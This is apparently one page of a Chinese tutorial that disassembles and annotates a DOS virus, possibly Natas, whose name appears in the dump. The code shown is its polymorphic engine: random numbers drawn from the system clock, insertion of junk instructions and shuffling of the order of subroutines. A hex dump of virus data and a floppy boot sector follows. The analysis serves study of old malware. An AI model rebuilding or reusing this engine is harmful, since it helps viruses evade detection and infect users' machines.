+9E80:1114 9C             PUSHF	 
+9E80:1115 F7D0           NOT	AX 
+9E80:1117 23E8           AND	BP,AX 		;将 BP 中相应位清零
+9E80:1119 9D             POPF	 
+9E80:111A 58             POP	AX 
+9E80:111B 74EA           JZ	1107 		;BP 中相应为原来已是零转 1107
+9E80:111D C3             RET			;重新选取
+;============================================================================
+; 恢复相应寄存器, 入口: AX = 寄存器号
+; (将 BP 中相应位设置为 1 )
+9E80:111E 50             PUSH	AX 
+9E80:111F 98             CBW	 
+9E80:1120 E80400         CALL	1127 
+9E80:1123 0BE8           OR	BP,AX 
+9E80:1125 58             POP	AX 
+9E80:1126 C3             RET
+;============================================================================
+; 将 AX 中的数值转换为 AX 中的 BIT 位
+9E80:1127 51             PUSH	CX 
+9E80:1128 8AC8           MOV	CL,AL 
+9E80:112A B001           MOV	AL,01 
+9E80:112C D2E0           SHL	AL,CL 
+9E80:112E 59             POP	CX 
+9E80:112F C3             RET
+;====================================================================
+; 按随机顺序执行 BX, CX, DX, SI 所指的子程序
+9E80:1130 E8F6FE         CALL	1029 		;随机加入无效指令
+9E80:1133 B80200         MOV	AX,0002 
+9E80:1136 E82D00         CALL	1166 
+9E80:1139 91             XCHG	AX,CX 		;产生随机数于 CX ( <3 )
+9E80:113A 41             INC	CX 
+9E80:113B E81C00         CALL	115A 		;将原 BX, CX, DX, SI
+9E80:113E 7501           JNZ	1141 		;随机对换
+9E80:1140 93             XCHG	AX,BX 
+9E80:1141 E81600         CALL	115A 
+9E80:1144 7501           JNZ	1147 
+9E80:1146 92             XCHG	AX,DX 
+9E80:1147 E81000         CALL	115A 
+9E80:114A 7501           JNZ	114D 
+9E80:114C 96             XCHG	AX,SI 
+9E80:114D E2EC           LOOP	113B 
+9E80:114F 56             PUSH	SI 		;将原 BX, CX, DX, SI
+9E80:1150 52             PUSH	DX 		;当作返回地址压入堆栈再返回
+9E80:1151 53             PUSH	BX 		;即以下执行 BX, CX, DX, SI
+9E80:1152 50             PUSH	AX 		;所指的子程序
+9E80:1153 C3             RET
+;======================================================================
+; 产生小于等于 BX 的随机数, 返回: BX = 随机数
+9E80:1154 93             XCHG	AX,BX 
+9E80:1155 E80E00         CALL	1166 
+9E80:1158 93             XCHG	AX,BX 
+9E80:1159 C3             RET
+;======================================================================
+; 随机分支子程序, 返回 NZ 或 ZR
+9E80:115A 50             PUSH	AX 
+9E80:115B B80100         MOV	AX,0001 
+9E80:115E E80500         CALL	1166 
+9E80:1161 58             POP	AX 
+9E80:1162 C3             RET
+9E80:1163 B8FFFF         MOV	AX,FFFF 
+;=======================================================================
+; 产生小于等于 AX 的随机数, 返回: AX = 随机数, 并且 AX = 0 时返回 ZR
+; AX <> 0 时返回 NZ
+9E80:1166 1E             PUSH	DS 
+9E80:1167 53             PUSH	BX 
+9E80:1168 51             PUSH	CX 
+9E80:1169 52             PUSH	DX 
+9E80:116A 50             PUSH	AX 
+9E80:116B 33C0           XOR	AX,AX 		;取系统时钟 (随机)
+9E80:116D CD1A           INT	1A 		;返回 CX:DX = 时钟计数
+9E80:116F 0E             PUSH	CS 
+9E80:1170 1F             POP	DS 
+9E80:1171 E440           IN	AL,40		;取 8253 通道一计数器 (随机)
+9E80:1173 91             XCHG	AX,CX 		;CL = 8253 随机数
+9E80:1174 92             XCHG	AX,DX 		;DX:AX = 时钟随机数
+9E80:1175 BB9C11         MOV	BX,119C 
+9E80:1178 3107           XOR	[BX],AX 
+9E80:117A D307           ROL	Word Ptr [BX],CL 
+9E80:117C 330F           XOR	CX,[BX] 
+9E80:117E D3C0           ROL	AX,CL 
+9E80:1180 3317           XOR	DX,[BX] 
+9E80:1182 D3CA           ROR	DX,CL 
+9E80:1184 33C2           XOR	AX,DX 
+9E80:1186 F7EA           IMUL	DX 
+9E80:1188 33C2           XOR	AX,DX 
+9E80:118A 3107           XOR	[BX],AX 
+9E80:118C 59             POP	CX 
+9E80:118D 33D2           XOR	DX,DX 		;DX:AX = 随机数
+9E80:118F 41             INC	CX 
+9E80:1190 7403           JZ	1195 
+9E80:1192 F7F1           DIV	CX 
+9E80:1194 92             XCHG	AX,DX 		;DX = 余数 (小于入口数的随机数)
+9E80:1195 5A             POP	DX 		;返回 AX = 随机数
+9E80:1196 59             POP	CX 
+9E80:1197 5B             POP	BX 
+9E80:1198 1F             POP	DS 
+9E80:1199 0BC0           OR	AX,AX 
+9E80:119B C3             RET
+	 
+9E80:119C                                      C5 DB 8B 1E              E[..
+9E80:11A0  C3 0A B8 C3 F0 B9 ED 08-33 FF F8 F8 F8 F8 F8 F8  C.8Cp9m.3.xxxxxx
+9E80:11B0  F8 F8 47 47 E2 F4 B4 40-B9 88 12 99 9C 2E FF 1E  xxGGbt4@9.......
+9E80:11C0  FB 13 72 02 2B C1 9C 5D-C7 04 00 00 C6 06 B8 12  {.r.+A.]G...F.8.
+9E80:11D0  C3 EB CB 4E 61 74 61 73-00 90 31 F1 BA C3 F0 C7  CkKNatas..1q:CpG
+9E80:11E0  C3 ED 08 F9 8B CC F5 1B-ED 87 F0 81 CD EC A9 97  Cm.y.Lu.m.p.Ml).
+9E80:11F0  87 F9 8B C1 45 45 F9 89-F8 89 DE F5 11 96 6D 56  .y.AEEy.x.^u..mV
+9E80:1200  81 C2 1A E5 4B 89 E0 81-CB 00 00 79 E3 E9 62 F1  .B.eK.`.K..ycibq
+9E80:1210  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1220  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1230  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1240  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1250  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1260  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1270  46 31 20 3D 20 22 48 3B-22 0D 0A 46 32 20 3D 20  F1 = "H;"..F2 = 
+9E80:1280  22 5E 57 52 3B 22 0D 0A-46 31 20 3D 20 22 48 3B  "^WR;"..F1 = "H;
+9E80:1290  22 0D 0A 46 32 20 3D 20-22 5E 57 52 3B 22 0D 0A  "..F2 = "^WR;"..
+9E80:12A0  8B 1E C3 0A B8 C3 F0 B9-ED 08 33 FF 01 05 F8 05  ..C.8Cp9m.3...x.
+9E80:12B0  1A E5 F8 F8 47 47 E2 F4-C3 40 B9 88 12 99 9C 2E  .exxGGbtC@9.....
+9E80:12C0  FF 1E FB 13 72 02 2B C1-9C 5D C7 04 01 05 C6 06  ..{.r.+A.]G...F.
+9E80:12D0  B8 12 C3 EB CB 53 10 7E-8F 00 00 00 00 00 00 00  8.CkKS.~........
+9E80:12E0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:12F0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1300  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1310  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1320  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1330  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1340  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1350  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1360  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1370  00 00 00 00 00 00 00 80-9E 00 00 80 9E 00 00 6F  ...............o
+9E80:1380  11 80 9E 00 00 6F 11 80-9E 80 9E 01 00 EC F9 30  .....o.......ly0
+9E80:1390  80 20 01 20 80 40 00 00-00 6D EF 00 F0 86 70 18  . . .@...mo.p.p.
+9E80:13A0  00 05 00 18 00 39 03 00-00 83 01 0A 3E 03 00 C5  .....9......>..E
+9E80:13B0  13 05 47 16 12 01 00 CA-44 53 10 53 10 01 00 24  ..G....JDS.S...$
+9E80:13C0  40 28 0A C7 08 53 10 53-10 B5 6D C7 6B 80 9E 7A  @(.G.S.S.5mGk..z
+9E80:13D0  6B 4E 00 01 00 0A 40 46-72 00 00 00 00 00 00 00  kN....@Fr.......
+9E80:13E0  00 00 00 00 00 00 00 56-09 53 10 59 EC 00 F0 59  .......V.S.Yl.pY
+9E80:13F0  EC 00 F0 59 F8 00 F0 59-EC 00 F0 F8 40 11 00 B0  l.pYx.pYl.px@..0
+9E80:1400  03 CF C7 08 5B 00 6D 56-B2 12 AC 12 02 03 05 FF  .OG.[.mV2.,.....
+9E80:1410  05 00 00                                         ...
+9E80:1413           EB 3C 90 4D 53-44 4F 53 35 2E 30 00 02     k<.MSDOS5.0..
+9E80:1420  01 01 00 02 E0 00 51 09-F9 07 00 0F 00 02 00 00  ....`.Q.y.......
+9E80:1430  00 00 00 00 00 00 00 00-00 29 14 06 1A 1A 41 43  .........)....AC
+9E80:1440  4C 49 42 32 34 20 20 20-20 46 41 54 31 32 20 20  LIB24    FAT12  
+9E80:1450  20 E8 00 00 BF 40 00 8E-DF 83 6D D3 06 8B 45 D3   h..?@.._.mS..ES
+9E80:1460  B1 0A D3 C8 8E C0 B8 09-02 33 DB B9 01 4F BA 00  1.SH.@8..3[9.O:.
+9E80:1470  01 CD 13 72 03 06 53 CB-CD 18 F9 89 47 02 C7 07  .M.r..SKM.y.G.G.
+9E80:1480  3E 7C FB CD 13 72 79 33-C0 39 06 13 7C 74 08 8B  >|{M.ry3@9..|t..
+9E80:1490  0E 13 7C 89 0E 20 7C A0-10 7C F7 26 16 7C 03 06  ..|.. | .|w&.|..
+9E80:14A0  1C 7C 13 16 1E 7C 03 06-0E 7C 83 D2 00 A3 50 7C  .|...|...|.R.#P|
+9E80:14B0  89 16 52 7C A3 49 7C 89-16 4B 7C B8 20 00 F7 26  ..R|#I|..K|8 .w&
+9E80:14C0  11 7C 8B 1E 0B 7C 03 C3-48 F7 F3 01 06 49 7C 83  .|...|.CHws..I|.
+9E80:14D0  16 4B 7C 00 BB 00 05 8B-16 52 7C A1 50 7C E8 92  .K|.;....R|!P|h.
+9E80:14E0  00 72 1D B0 01 E8 AC 00-72 16 8B FB B9 0B 00 BE  .r.0.h,.r..{9..>
+9E80:14F0  E6 7D F3 A6 75 0A 8D 7F-20 B9 0B 00 F3 A6 74 18  f}s&u... 9..s&t.
+9E80:1500  BE 9E 7D E8 5F 00 33 C0-CD 16 5E 1F 8F 04 8F 44  >.}h_.3@M.^....D
+9E80:1510  02 CD 19 58 58 58 EB E8-8B 47 1A 48 48 8A 1E 0D  .M.XXXkh.G.HH...
+9E80:1520  7C 32 FF F7 E3 03 06 49-7C 13 16 4B 7C BB 00 07  |2.wc..I|..K|;..
+9E80:1530  B9 03 00 50 52 51 E8 3A-00 72 D8 B0 01 E8 54 00  9..PRQh:.rX0.hT.
+9E80:1540  59 5A 58 72 BB 05 01 00-83 D2 00 03 1E 0B 7C E2  YZXr;....R....|b
+9E80:1550  E2 8A 2E 15 7C 8A 16 24-7C 8B 1E 49 7C A1 4B 7C  b...|..$|..I|!K|
+9E80:1560  EA 00 00 70 00 AC 0A C0-74 29 B4 0E BB 07 00 CD  j..p.,.@t)4.;..M
+9E80:1570  10 EB F2 3B 16 18 7C 73-19 F7 36 18 7C FE C2 88  .kr;..|s.w6.|~B.
+9E80:1580  16 4F 7C 33 D2 F7 36 1A-7C 88 16 25 7C A3 4D 7C  .O|3Rw6.|..%|#M|
+9E80:1590  F8 C3 F9 C3 B4 02 8B 16-4D 7C B1 06 D2 E6 0A 36  xCyC4...M|1.Rf.6
+9E80:15A0  4F 7C 8B CA 86 E9 8A 16-24 7C 8A 36 25 7C CD 13  O|.J.i..$|.6%|M.
+9E80:15B0  C3 0D 0A 4E 6F 6E 2D 53-79 73 74 65 6D 20 64 69  C..Non-System di
+9E80:15C0  73 6B 20 6F 72 20 64 69-73 6B 20 65 72 72 6F 72  sk or disk error
+9E80:15D0  0D 0A 52 65 70 6C 61 63-65 20 61 6E 64 20 70 72  ..Replace and pr
+9E80:15E0  65 73 73 20 61 6E 79 20-6B 65 79 20 77 68 65 6E  ess any key when
+9E80:15F0  20 72 65 61 64 79 0D 0A-00 49 4F 20 20 20 20 20   ready...IO     
+9E80:1600  20 53 59 53 4D 53 44 4F-53 20 20 20 53 59 53 00   SYSMSDOS   SYS.
+9E80:1610  00 55 AA                                         .U* 
+9E80:1613           00 00 00 00 00-00 00 00 00 00 00 00 00     .............
+9E80:1620  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1630  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1640  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1650  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1660  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1670  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1680  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1690  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:16A0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:16B0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:16C0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:16D0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:16E0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:16F0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1700  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1710  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1720  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1730  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1740  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1750  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1760  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1770  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1780  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:1790  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:17A0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:17B0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:17C0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:17D0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:17E0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+9E80:17F0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
+</pre>
+<div class="rpindex"><a href="113.html"> 上一页</a><a href="index.html">首页</a></div>
+
+
+
+<!-- tail-start -->
+﻿
+<div style="clear:both;"></div>
+
+</div>
+<!--end of file-wrpper-->
+</div>
+<!--end of content-wrapper-->
+</div>
+<!--end of container-->
+
+
+<footer>
+<p class="copyright">版权所有 2014 <a href="http://www.iteedu.com">ITEEDU</a>, 京ICP备16069454号</p>
+</footer>
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.8.0/styles/default.min.css">
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.8.0/highlight.min.js"></script>
+
+<!--百度统计js-->
+<p style="display:none">
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fa5213b08a76d4fc6b8a80eb382490e0b' type='text/javascript'%3E%3C/script%3E"));
+</script>
+</p>
+
+</body>
+
+</html>
+
+
+<!-- tail-end -->
